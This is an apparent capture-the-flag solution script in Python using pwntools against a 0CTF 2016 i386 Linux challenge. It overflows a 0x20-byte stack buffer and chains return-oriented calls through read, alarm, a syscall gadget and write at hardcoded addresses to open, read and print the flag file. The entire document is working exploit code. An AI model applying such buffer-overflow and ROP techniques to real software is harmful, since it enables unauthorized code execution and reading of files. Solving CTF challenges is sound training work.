from parse_args_and_some_func import *

sh: tube = all_parsed_args['io']
context.update(arch='i386', os='linux', endian='little')

welcome_str_addr = 0x80491bc
good_luck_str_addr = 0x80491d3
read_addr = 0x804811d
write_addr = 0x8048135
main_addr = 0x804815a
alarm_addr = 0x804810d
mov_ebx_syscall = 0x8048122

layout = ['a' * 0x20, read_addr, main_addr, 0, good_luck_str_addr, 0x60]
payload = flat(layout)
sh.sendafter("Welcome to 0CTF 2016!\n", payload)
# STOP()
sh.sendafter("Good Luck!\n", "flag\x00")
sleep(5)
layout = ['a' * 0x20, alarm_addr, mov_ebx_syscall, main_addr, good_luck_str_addr, 0]
sh.send(flat(layout))

layout = ['a' * 0x20, read_addr, main_addr, 3, welcome_str_addr, 0x40]
sh.recvline()
sh.send(flat(layout))

layout = ['a' * 0x20, write_addr, 0xdeadbeef, 1, welcome_str_addr, 0x40]
sh.recvline()
sh.send(flat(layout))

sh.interactive()